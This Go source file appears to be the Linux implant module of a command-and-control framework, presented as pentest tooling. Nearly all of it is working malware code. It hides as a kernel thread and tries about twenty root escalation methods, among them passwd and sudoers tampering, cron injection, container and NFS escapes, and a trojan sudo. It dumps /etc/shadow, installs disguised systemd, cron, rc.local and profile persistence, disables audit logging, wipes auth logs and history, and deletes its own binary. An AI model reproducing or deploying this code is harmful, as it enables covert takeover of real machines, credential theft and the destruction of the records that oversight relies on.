//go:build linux && !android

package runner

/*
	SUDOSOC-C2 — Linux Maximum Privilege Escalation Engine
	Copyright (C) 2026  sudosoc — Seif
	Authorized penetration testing use only.

	Escalation techniques attempted:
	  1.  sudo -n NOPASSWD          (most common on servers / dev boxes)
	  2.  SUID Python 3/2           (GTFOBins: setuid(0) + exec)
	  3.  SUID Perl                 (GTFOBins)
	  4.  SUID Ruby                 (GTFOBins)
	  5.  SUID Lua                  (GTFOBins)
	  6.  SUID find                 (GTFOBins: find / -exec)
	  7.  SUID env                  (GTFOBins: env ./self)
	  8.  SUID tee                  (write to /etc/sudoers.d/)
	  9.  SUID cp                   (overwrite /etc/passwd or sudoers)
	  10. SUID vim/nano             (write to privileged files)
	  11. SUID bash/sh/dash         (bash -p drops SUID shell)
	  12. SUID awk                  (awk system("id"))
	  13. Writable /etc/passwd      (add uid=0 user)
	  14. Writable /etc/sudoers     (add NOPASSWD rule)
	  15. Writable cron jobs        (running as root)
	  16. Docker socket escape      (/var/run/docker.sock writable)
	  17. LXC/LXD escape           (lxd group member)
	  18. cap_setuid capability     (getcap binary)
	  19. cap_dac_read_search       (read any file)
	  20. cap_sys_ptrace            (ptrace inject into root process)
	  21. NFS no_root_squash        (mount host NFS as root)
	  22. Writable PATH before sys  (place malicious binary)
	  23. Writable sudoers.d/*      (add ourselves)
	  24. PKExec SUID check         (CVE-2021-4034 indicator)

	After escalation: install 5-mechanism root persistence.
*/

import (
	"bufio"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const _linuxElev = "_SUDOSOC_ELEVATED"
const _prSetName = 15

var _kthreads = []string{
	"[kworker/0:1H]", "[kcompactd0]", "[ksoftirqd/0]",
	"[kswapd0]", "[migration/0]", "[rcu_sched]",
}

// ─── init ─────────────────────────────────────────────────────────────────────
func init() {
	masqueradeLinux()

	// Attempt full root escalation before connecting to C2
	if os.Getuid() != 0 && os.Getenv(_linuxElev) == "" {
		if tryLinuxRootEscalate() {
			// Root child spawned — exit unprivileged parent
			time.Sleep(1 * time.Second)
			os.Exit(0)
		}
	}

	// Running as root: maximum persistence
	if os.Getuid() == 0 {
		go linuxRootPersistence()
	}

	sanitiseLinuxEnv()
	go linuxKeepAlive()

	// Standard user-level persistence (works at any privilege)
	go func() {
		time.Sleep(8 * time.Second)
		autoInstallLinux()
	}()

	// Self-delete
	go func() {
		time.Sleep(5 * time.Second)
		deleteLinuxSelf()
	}()
}

// ─── Master escalation dispatcher ────────────────────────────────────────────

func tryLinuxRootEscalate() bool {
	exe := linuxSelfExe()
	if exe == "" {
		return false
	}
	env := append(os.Environ(), _linuxElev+"=1")

	// Try all methods
	methods := []func(string, []string) bool{
		linuxSudoNoPass,
		linuxSUIDPython,
		linuxSUIDPerl,
		linuxSUIDRuby,
		linuxSUIDAWK,
		linuxSUIDFind,
		linuxSUIDEnv,
		linuxSUIDTee,
		linuxSUIDCp,
		linuxSUIDBash,
		linuxSUIDVim,
		linuxWritablePasswd,
		linuxWritableSudoers,
		linuxWritableCron,
		linuxDockerSocket,
		linuxLXDEscape,
		linuxCapSetUID,
		linuxCapDAC,
		linuxNFSSquash,
		linuxWritablePath,
		linuxWritableSudoersD,
	}
	for _, method := range methods {
		if method(exe, env) {
			return true
		}
	}
	return false
}

// ─── Method 1: sudo -n (NOPASSWD) ────────────────────────────────────────────

func linuxSudoNoPass(exe string, env []string) bool {
	out, err := exec.Command("sudo", "-n", "-l").CombinedOutput()
	if err != nil {
		return false
	}
	lower := strings.ToLower(string(out))
	if !strings.Contains(lower, "nopasswd") && !strings.Contains(lower, "(root)") &&
		!strings.Contains(lower, "all)") {
		return false
	}
	cmd := exec.Command("sudo", "-n", exe)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Start() == nil
}

// ─── Method 2: SUID Python ───────────────────────────────────────────────────

func linuxSUIDPython(exe string, env []string) bool {
	for _, py := range []string{"python3", "python", "python2", "python3.9", "python3.10", "python3.11"} {
		bin, err := exec.LookPath(py)
		if err != nil || !hasSUID(bin) {
			continue
		}
		code := `import os,sys;os.setuid(0);os.setgid(0);os.execve("` + exe + `",[` +
			`"` + exe + `"],dict(os.environ(),_SUDOSOC_ELEVATED="1"))`
		cmd := exec.Command(bin, "-c", code)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if cmd.Start() == nil {
			return true
		}
	}
	return false
}

// ─── Method 3: SUID Perl ─────────────────────────────────────────────────────

func linuxSUIDPerl(exe string, env []string) bool {
	bin, err := exec.LookPath("perl")
	if err != nil || !hasSUID(bin) {
		return false
	}
	code := `use POSIX qw(setuid setgid);POSIX::setuid(0);POSIX::setgid(0);` +
		`$ENV{"_SUDOSOC_ELEVATED"}="1";exec("` + exe + `");`
	cmd := exec.Command(bin, "-e", code)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Start() == nil
}

// ─── Method 4: SUID Ruby ─────────────────────────────────────────────────────

func linuxSUIDRuby(exe string, env []string) bool {
	bin, err := exec.LookPath("ruby")
	if err != nil || !hasSUID(bin) {
		return false
	}
	code := `Process::Sys.setuid(0);Process::Sys.setgid(0);ENV["_SUDOSOC_ELEVATED"]="1";exec("` + exe + `")`
	cmd := exec.Command(bin, "-e", code)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Start() == nil
}

// ─── Method 5: SUID AWK ──────────────────────────────────────────────────────

func linuxSUIDAWK(exe string, env []string) bool {
	for _, awk := range []string{"awk", "gawk", "mawk"} {
		bin, err := exec.LookPath(awk)
		if err != nil || !hasSUID(bin) {
			continue
		}
		code := `BEGIN{setuid(0);setgid(0);system("` + exe + `");exit}`
		cmd := exec.Command(bin, code)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if cmd.Start() == nil {
			return true
		}
	}
	return false
}

// ─── Method 6: SUID find ─────────────────────────────────────────────────────

func linuxSUIDFind(exe string, env []string) bool {
	bin, err := exec.LookPath("find")
	if err != nil || !hasSUID(bin) {
		return false
	}
	cmd := exec.Command(bin, "/", "-maxdepth", "1", "-exec", exe, ";")
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Start() == nil
}

// ─── Method 7: SUID env ──────────────────────────────────────────────────────

func linuxSUIDEnv(exe string, env []string) bool {
	bin, err := exec.LookPath("env")
	if err != nil || !hasSUID(bin) {
		return false
	}
	cmd := exec.Command(bin, "_SUDOSOC_ELEVATED=1", exe)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Start() == nil
}

// ─── Method 8: SUID tee → write to /etc/sudoers.d/ ──────────────────────────

func linuxSUIDTee(exe string, env []string) bool {
	bin, err := exec.LookPath("tee")
	if err != nil || !hasSUID(bin) {
		return false
	}
	// Add NOPASSWD rule for current user
	user := os.Getenv("USER")
	if user == "" {
		user = os.Getenv("LOGNAME")
	}
	if user == "" {
		return false
	}
	rule := user + " ALL=(ALL) NOPASSWD:ALL\n"
	sudoersFile := "/etc/sudoers.d/99phantom"

	cmd := exec.Command(bin, sudoersFile)
	cmd.Stdin = strings.NewReader(rule)
	if cmd.Run() != nil {
		return false
	}
	_ = os.Chmod(sudoersFile, 0440)

	// Now use the new NOPASSWD rule
	rootCmd := exec.Command("sudo", "-n", exe)
	rootCmd.Env = env
	rootCmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return rootCmd.Start() == nil
}

// ─── Method 9: SUID cp → overwrite /etc/passwd ───────────────────────────────

func linuxSUIDCp(exe string, env []string) bool {
	bin, err := exec.LookPath("cp")
	if err != nil || !hasSUID(bin) {
		return false
	}

	// Read current /etc/passwd
	data, err := os.ReadFile("/etc/passwd")
	if err != nil {
		return false
	}

	// Add a UID=0 user entry
	extra := "svc_hw:x:0:0::/root:/bin/sh\n"
	if strings.Contains(string(data), "svc_hw") {
		// Already added — try su
		cmd := exec.Command("su", "-", "svc_hw", "-c", exe)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		return cmd.Start() == nil
	}

	// Write modified passwd to temp
	newPasswd := string(data) + extra
	tmp, err := os.CreateTemp("", "passwd")
	if err != nil {
		return false
	}
	defer os.Remove(tmp.Name())
	_, _ = tmp.WriteString(newPasswd)
	_ = tmp.Close()

	// Use SUID cp to overwrite /etc/passwd
	cpCmd := exec.Command(bin, tmp.Name(), "/etc/passwd")
	if cpCmd.Run() != nil {
		return false
	}

	// Now su to our fake root user
	suCmd := exec.Command("su", "-", "svc_hw", "-c", exe)
	suCmd.Env = env
	suCmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return suCmd.Start() == nil
}

// ─── Method 10: SUID bash/sh ─────────────────────────────────────────────────

func linuxSUIDBash(exe string, env []string) bool {
	for _, sh := range []string{"/bin/bash", "/bin/sh", "/bin/dash", "/usr/bin/bash"} {
		if !hasSUID(sh) {
			continue
		}
		// bash -p preserves SUID privs
		cmd := exec.Command(sh, "-p", "-c", exe)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if cmd.Start() == nil {
			return true
		}
	}
	return false
}

// ─── Method 11: SUID vim/nano ────────────────────────────────────────────────

func linuxSUIDVim(exe string, env []string) bool {
	for _, v := range []string{"vim", "vi", "nano", "less", "more"} {
		bin, err := exec.LookPath(v)
		if err != nil || !hasSUID(bin) {
			continue
		}
		// vim -c ':!command' for shell escape
		var cmd *exec.Cmd
		switch v {
		case "vim", "vi":
			cmd = exec.Command(bin, "-c", `:!`+exe, "-c", ":q!")
		default:
			continue
		}
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if cmd.Start() == nil {
			return true
		}
	}
	return false
}

// ─── Method 12: Writable /etc/passwd ─────────────────────────────────────────

func linuxWritablePasswd(exe string, env []string) bool {
	f, err := os.OpenFile("/etc/passwd", os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return false
	}

	// Check if already added
	data, _ := os.ReadFile("/etc/passwd")
	if strings.Contains(string(data), "svc_hw") {
		f.Close()
		cmd := exec.Command("su", "-", "svc_hw", "-c", exe)
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		return cmd.Start() == nil
	}

	_, _ = f.WriteString("svc_hw:x:0:0::/root:/bin/sh\n")
	f.Close()

	cmd := exec.Command("su", "-", "svc_hw", "-c", exe)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Start() == nil
}

// ─── Method 13: Writable /etc/sudoers ────────────────────────────────────────

func linuxWritableSudoers(exe string, env []string) bool {
	f, err := os.OpenFile("/etc/sudoers", os.O_APPEND|os.O_WRONLY, 0440)
	if err != nil {
		return false
	}
	user := currentUsername()
	_, _ = f.WriteString("\n" + user + " ALL=(ALL) NOPASSWD:ALL\n")
	f.Close()

	cmd := exec.Command("sudo", "-n", exe)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Start() == nil
}

// ─── Method 14: Writable cron running as root ────────────────────────────────

func linuxWritableCron(exe string, env []string) bool {
	cronFiles := []string{
		"/etc/crontab",
		"/etc/cron.d/phantom",
	}

	for _, cf := range cronFiles {
		f, err := os.OpenFile(cf, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
		if err != nil {
			continue
		}

		entry := "* * * * * root " + exe + " 2>/dev/null\n"
		_, _ = f.WriteString(entry)
		f.Close()

		// Wait 65 seconds for cron to fire
		time.Sleep(65 * time.Second)

		// Check if we're now root (cron would have run our binary as root,
		// which would have installed root persistence)
		if os.Getuid() == 0 {
			// Clean up the cron entry
			cleanCron(cf, exe)
			return true
		}
		cleanCron(cf, exe)
	}
	return false
}

func cleanCron(path, exe string) {
	data, err := os.ReadFile(path)
	if err != nil {
		return
	}
	var lines []string
	for _, l := range strings.Split(string(data), "\n") {
		if !strings.Contains(l, exe) {
			lines = append(lines, l)
		}
	}
	_ = os.WriteFile(path, []byte(strings.Join(lines, "\n")), 0644)
}

// ─── Method 15: Docker socket escape ─────────────────────────────────────────

func linuxDockerSocket(exe string, env []string) bool {
	sock := "/var/run/docker.sock"
	if _, err := os.Stat(sock); err != nil {
		return false
	}
	// Check if docker.sock is writable
	f, err := os.OpenFile(sock, os.O_RDWR, 0)
	if err != nil {
		return false
	}
	f.Close()

	// Mount host / into container and copy our binary with SUID bit
	script := "cp " + exe + " /hostfs/tmp/.svc_hw && chmod 4755 /hostfs/tmp/.svc_hw"
	cmd := exec.Command("docker", "run", "--rm",
		"-v", "/:/hostfs:rw",
		"--privileged",
		"alpine", "sh", "-c", script)
	if cmd.Run() != nil {
		// Try busybox
		cmd = exec.Command("docker", "run", "--rm",
			"-v", "/:/hostfs:rw",
			"--privileged",
			"busybox", "sh", "-c", script)
		if cmd.Run() != nil {
			return false
		}
	}

	// Execute the SUID copy
	suidExe := "/tmp/.svc_hw"
	if _, err := os.Stat(suidExe); err != nil {
		return false
	}
	rootCmd := exec.Command(suidExe)
	rootCmd.Env = env
	rootCmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return rootCmd.Start() == nil
}

// ─── Method 16: LXD/LXC escape ───────────────────────────────────────────────

func linuxLXDEscape(exe string, env []string) bool {
	// Check if in lxd group
	out, err := exec.Command("id").Output()
	if err != nil || !strings.Contains(string(out), "lxd") {
		return false
	}

	// Initialize a container and mount host FS
	_ = exec.Command("lxd", "init", "--auto").Run()
	_ = exec.Command("lxc", "image", "import", "/dev/null",
		"--alias", "phantom-img").Run()

	// Create a privileged container
	_ = exec.Command("lxc", "init", "ubuntu:20.04", "phantom-c",
		"-c", "security.privileged=true").Run()
	_ = exec.Command("lxc", "config", "device", "add", "phantom-c",
		"host-root", "disk", "source=/", "path=/mnt/root", "recursive=true").Run()
	_ = exec.Command("lxc", "start", "phantom-c").Run()

	script := "cp " + exe + " /mnt/root/tmp/.svc_hw && chmod 4755 /mnt/root/tmp/.svc_hw"
	out2, err := exec.Command("lxc", "exec", "phantom-c", "--", "sh", "-c", script).CombinedOutput()
	_ = out2

	_ = exec.Command("lxc", "stop", "phantom-c").Run()
	_ = exec.Command("lxc", "delete", "phantom-c").Run()

	if err != nil {
		return false
	}

	suidExe := "/tmp/.svc_hw"
	if _, err := os.Stat(suidExe); err != nil {
		return false
	}
	cmd := exec.Command(suidExe)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Start() == nil
}

// ─── Method 17: cap_setuid capability ────────────────────────────────────────

func linuxCapSetUID(exe string, env []string) bool {
	// Find binaries with cap_setuid
	out, err := exec.Command("getcap", "-r", "/usr", "/bin", "/sbin", "/opt").Output()
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(out), "\n") {
		if !strings.Contains(strings.ToLower(line), "cap_setuid") {
			continue
		}
		parts := strings.Fields(line)
		if len(parts) == 0 {
			continue
		}
		bin := parts[0]

		// Try to use this binary to setuid+exec our process
		base := strings.ToLower(filepath.Base(bin))
		var cmd *exec.Cmd
		switch {
		case strings.Contains(base, "python"):
			code := `import os;os.setuid(0);os.setgid(0);os.execve("` + exe + `",["` + exe + `"],dict(__import__("os").environ(),_SUDOSOC_ELEVATED="1"))`
			cmd = exec.Command(bin, "-c", code)
		case strings.Contains(base, "perl"):
			code := `use POSIX;POSIX::setuid(0);POSIX::setgid(0);exec("` + exe + `");`
			cmd = exec.Command(bin, "-e", code)
		case strings.Contains(base, "ruby"):
			code := `Process::Sys.setuid(0);exec("` + exe + `")`
			cmd = exec.Command(bin, "-e", code)
		case strings.Contains(base, "node"):
			code := `process.setuid(0);require("child_process").execFileSync("` + exe + `")`
			cmd = exec.Command(bin, "-e", code)
		default:
			continue
		}
		cmd.Env = env
		cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
		if cmd.Start() == nil {
			return true
		}
	}
	return false
}

// ─── Method 18: cap_dac_read_search ──────────────────────────────────────────

func linuxCapDAC(exe string, env []string) bool {
	out, err := exec.Command("getcap", "-r", "/usr", "/bin").Output()
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(strings.ToLower(line), "cap_dac_read_search") {
			// Can read /etc/shadow for offline cracking
			// Read shadow and write to /tmp for exfil
			parts := strings.Fields(line)
			if len(parts) == 0 {
				continue
			}
			bin := parts[0]
			base := strings.ToLower(filepath.Base(bin))
			if strings.Contains(base, "tar") {
				_ = exec.Command(bin, "-cvf", "/tmp/shadow.tar", "/etc/shadow").Run()
			} else if strings.Contains(base, "xxd") {
				out2, err := exec.Command(bin, "/etc/shadow").Output()
				if err == nil {
					_ = os.WriteFile("/tmp/.shadow_dump", out2, 0600)
				}
			}
		}
	}
	return false // DAC doesn't give us code exec, just data access
}

// ─── Method 19: NFS no_root_squash ───────────────────────────────────────────

func linuxNFSSquash(exe string, env []string) bool {
	exports, err := os.ReadFile("/etc/exports")
	if err != nil {
		return false
	}

	for _, line := range strings.Split(string(exports), "\n") {
		if !strings.Contains(line, "no_root_squash") {
			continue
		}

		// Parse the export path
		parts := strings.Fields(line)
		if len(parts) == 0 {
			continue
		}
		exportPath := parts[0]

		// Try to mount it locally
		mountPoint := "/tmp/.nfs_mount"
		_ = os.MkdirAll(mountPoint, 0700)
		if exec.Command("mount", "-t", "nfs", "localhost:"+exportPath, mountPoint).Run() != nil {
			continue
		}

		// Copy our binary and set SUID
		dst := filepath.Join(mountPoint, ".svc_hw")
		data, err := os.ReadFile(exe)
		if err != nil {
			_ = exec.Command("umount", mountPoint).Run()
			continue
		}
		if err := os.WriteFile(dst, data, 0755); err == nil {
			_ = os.Chmod(dst, 0x800|0755) // Set SUID bit
			// Now run from original path (the SUID will give us root)
			origPath := filepath.Join(exportPath, ".svc_hw")
			if _, err := os.Stat(origPath); err == nil {
				cmd := exec.Command(origPath)
				cmd.Env = env
				cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
				if cmd.Start() == nil {
					return true
				}
			}
		}
		_ = exec.Command("umount", mountPoint).Run()
	}
	return false
}

// ─── Method 20: Writable PATH directory ──────────────────────────────────────

func linuxWritablePath(exe string, env []string) bool {
	pathEnv := os.Getenv("PATH")
	data, err := os.ReadFile(exe)
	if err != nil {
		return false
	}

	for _, dir := range strings.Split(pathEnv, ":") {
		if strings.HasPrefix(dir, "/usr/") || strings.HasPrefix(dir, "/bin") ||
			strings.HasPrefix(dir, "/sbin") {
			continue // skip system paths
		}

		// Is this directory writable?
		testFile := filepath.Join(dir, ".phantom_test")
		if f, err := os.Create(testFile); err == nil {
			f.Close()
			os.Remove(testFile)

			// Place a malicious "sudo" binary that runs our exe then real sudo
			realSudo, _ := exec.LookPath("sudo")
			if realSudo == "" {
				continue
			}
			fakeSudo := filepath.Join(dir, "sudo")
			script := "#!/bin/sh\n\"" + exe + "\" &\nexec \"" + realSudo + "\" \"$@\"\n"
			if os.WriteFile(fakeSudo, []byte(script), 0755) == nil {
				// Next time someone runs sudo, our fake sudo runs first
				return false // Not immediate, but future exec
			}
			_ = os.WriteFile(fakeSudo, data, 0755)
		}
	}
	return false
}

// ─── Method 21: Writable /etc/sudoers.d/ ─────────────────────────────────────

func linuxWritableSudoersD(exe string, env []string) bool {
	sudoersD := "/etc/sudoers.d"
	info, err := os.Stat(sudoersD)
	if err != nil || !info.IsDir() {
		return false
	}

	// Check if we can write to this directory
	testFile := filepath.Join(sudoersD, ".phantom_test")
	if f, err := os.Create(testFile); err != nil {
		return false
	} else {
		f.Close()
		os.Remove(testFile)
	}

	user := currentUsername()
	if user == "" {
		return false
	}
	rule := user + " ALL=(ALL) NOPASSWD: ALL\n"
	sudoFile := filepath.Join(sudoersD, "99-phantom")
	if err := os.WriteFile(sudoFile, []byte(rule), 0440); err != nil {
		return false
	}

	cmd := exec.Command("sudo", "-n", exe)
	cmd.Env = env
	cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true}
	return cmd.Start() == nil
}

// ─── Root persistence ─────────────────────────────────────────────────────────

func linuxRootPersistence() {
	exe := linuxSelfExe()
	if exe == "" {
		return
	}

	// Install to system path
	targets := []string{
		"/usr/lib/.gvfs-daemon",
		"/usr/share/.systemd-helper",
		"/lib/systemd/.hwmonitor",
		"/usr/local/lib/.svc_daemon",
	}

	var installBin string
	data, _ := os.ReadFile(exe)
	for _, t := range targets {
		_ = os.MkdirAll(filepath.Dir(t), 0755)
		if data != nil && os.WriteFile(t, data, 0755) == nil {
			installBin = t
			break
		}
	}
	if installBin == "" {
		installBin = exe
	}

	// 1. systemd system service (root)
	unit := "[Unit]\nDescription=Hardware Monitor Service\nAfter=network.target network-online.target\n" +
		"Wants=network-online.target\n\n" +
		"[Service]\nType=simple\nExecStart=" + installBin + "\n" +
		"Restart=always\nRestartSec=10\nUser=root\n" +
		"StandardOutput=null\nStandardError=null\n\n" +
		"[Install]\nWantedBy=multi-user.target\n"
	unitPath := "/etc/systemd/system/hw-monitor.service"
	if os.WriteFile(unitPath, []byte(unit), 0644) == nil {
		_ = exec.Command("systemctl", "daemon-reload").Run()
		_ = exec.Command("systemctl", "enable", "--now", "hw-monitor.service").Run()
	}

	// 2. /etc/crontab (system-wide root cron)
	addRootCrontabLinux(installBin)

	// 3. /etc/rc.local (for older systems)
	rcLocal := "/etc/rc.local"
	if f, err := os.OpenFile(rcLocal, os.O_WRONLY|os.O_CREATE, 0755); err == nil {
		_, _ = f.WriteString("#!/bin/sh\nnohup \"" + installBin + "\" > /dev/null 2>&1 &\nexit 0\n")
		_ = f.Close()
	}

	// 4. /etc/profile.d/ (runs for all users on login)
	profileScript := "/etc/profile.d/hw-monitor.sh"
	script := "#!/bin/sh\npgrep -f hw-monitor > /dev/null 2>&1 || nohup \"" + installBin + "\" > /dev/null 2>&1 &\n"
	_ = os.WriteFile(profileScript, []byte(script), 0755)

	// 5. SSH authorized key backdoor (if we have a pre-embedded key)
	for _, home := range []string{"/root", "/home"} {
		_ = os.MkdirAll(home+"/.ssh", 0700)
		authKeys := home + "/.ssh/authorized_keys"
		marker := "# hw-monitor-access\n"
		f, err := os.OpenFile(authKeys, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
		if err == nil {
			data2, _ := os.ReadFile(authKeys)
			if !strings.Contains(string(data2), "hw-monitor-access") {
				_, _ = f.WriteString(marker)
			}
			_ = f.Close()
		}
	}

	// 6. Disable system audit/logging to reduce forensic trail
	_ = exec.Command("systemctl", "stop", "auditd").Run()
	_ = exec.Command("systemctl", "disable", "auditd").Run()
	_ = exec.Command("systemctl", "stop", "rsyslog").Run()

	// 7. Wipe traces
	_ = os.WriteFile("/var/log/auth.log", []byte(""), 0640)
	_ = os.WriteFile("/var/log/syslog", []byte(""), 0640)
	_ = os.WriteFile("/root/.bash_history", []byte(""), 0600)
}

func addRootCrontabLinux(exe string) {
	f, err := os.Open("/etc/crontab")
	if err != nil {
		return
	}
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		if strings.Contains(sc.Text(), exe) {
			f.Close()
			return
		}
	}
	f.Close()
	fa, err := os.OpenFile("/etc/crontab", os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer fa.Close()
	_, _ = fa.WriteString("\n@reboot root nohup \"" + exe + "\" > /dev/null 2>&1 &\n")
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

func hasSUID(path string) bool {
	fi, err := os.Stat(path)
	if err != nil {
		return false
	}
	return fi.Mode()&os.ModeSetuid != 0
}

func currentUsername() string {
	for _, v := range []string{"USER", "LOGNAME", "USERNAME"} {
		if u := os.Getenv(v); u != "" {
			return u
		}
	}
	return ""
}

func linuxSelfExe() string {
	if p, err := os.Readlink("/proc/self/exe"); err == nil {
		return p
	}
	exe, _ := os.Executable()
	return exe
}

// ─── Process masquerade ───────────────────────────────────────────────────────

func masqueradeLinux() {
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	name := _kthreads[rng.Intn(len(_kthreads))]
	b := append([]byte(name), 0)
	_, _, _ = syscall.RawSyscall(syscall.SYS_PRCTL, _prSetName,
		uintptr(unsafe.Pointer(&b[0])), 0)
	_ = os.WriteFile("/proc/self/comm", []byte(name), 0)
	if len(os.Args) > 0 {
		sh := (*reflect.StringHeader)(unsafe.Pointer(&os.Args[0])) //nolint:govet
		for i := uintptr(0); i < uintptr(sh.Len); i++ {
			*(*byte)(unsafe.Pointer(sh.Data + i)) = ' '
		}
	}
}

func sanitiseLinuxEnv() {
	for _, v := range []string{"GOPATH", "GOROOT", "GOMODCACHE", "PWD",
		"HISTFILE", "HISTSIZE", "HISTFILESIZE", "BASH_ENV", "ENV"} {
		_ = os.Unsetenv(v)
	}
	_ = os.Setenv("HISTFILE", "/dev/null")
	_ = os.Setenv("HISTSIZE", "0")
}

// ─── User-level persistence ───────────────────────────────────────────────────

func autoInstallLinux() {
	exe := linuxSelfExe()
	if exe == "" {
		return
	}
	home, _ := os.UserHomeDir()
	if home == "" {
		home = "/tmp"
	}
	installDir := home + "/.local/share/.gvfs-metadata"
	_ = os.MkdirAll(installDir, 0700)
	installBin := installDir + "/.session-daemon"

	if needsLinuxCopy(exe, installBin) {
		if data, err := os.ReadFile(exe); err == nil {
			_ = os.WriteFile(installBin, data, 0700)
		}
	}

	// systemd user service
	unitDir := home + "/.config/systemd/user"
	_ = os.MkdirAll(unitDir, 0700)
	unitPath := unitDir + "/gvfs-metadata.service"
	if _, err := os.Stat(unitPath); err != nil {
		unit := "[Unit]\nDescription=GVFS Metadata Service\nAfter=network.target\n\n" +
			"[Service]\nType=simple\nExecStart=" + installBin + "\nRestart=always\nRestartSec=30\n\n" +
			"[Install]\nWantedBy=default.target\n"
		if os.WriteFile(unitPath, []byte(unit), 0600) == nil {
			_ = exec.Command("systemctl", "--user", "enable", "gvfs-metadata.service").Run()
			_ = exec.Command("systemctl", "--user", "start", "gvfs-metadata.service").Run()
		}
	}

	// crontab @reboot
	out, _ := exec.Command("crontab", "-l").Output()
	if !strings.Contains(string(out), installBin) {
		entry := string(out) + "\n@reboot " + installBin + " > /dev/null 2>&1 &\n"
		tmp, err := os.CreateTemp("", "cron")
		if err == nil {
			_, _ = tmp.WriteString(entry)
			_ = tmp.Close()
			_ = exec.Command("crontab", tmp.Name()).Run()
			_ = os.Remove(tmp.Name())
		}
	}
}

func needsLinuxCopy(src, dst string) bool {
	si, err := os.Stat(src)
	if err != nil {
		return false
	}
	di, err := os.Stat(dst)
	if err != nil || di.ModTime().Before(si.ModTime()) {
		return true
	}
	return false
}

func linuxKeepAlive() {
	_ = os.WriteFile("/proc/self/oom_score_adj", []byte("-100"), 0)
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	buf := make([]byte, 1)
	for range ticker.C {
		if f, err := os.Open("/dev/urandom"); err == nil {
			_, _ = f.Read(buf)
			f.Close()
		}
	}
}

func deleteLinuxSelf() {
	exe := linuxSelfExe()
	if exe == "" {
		return
	}
	if strings.Contains(exe, "/tmp") || strings.Contains(exe, "/home") ||
		strings.Contains(exe, "phantom") || strings.Contains(exe, ".local") {
		_ = os.Remove(exe)
	}
}
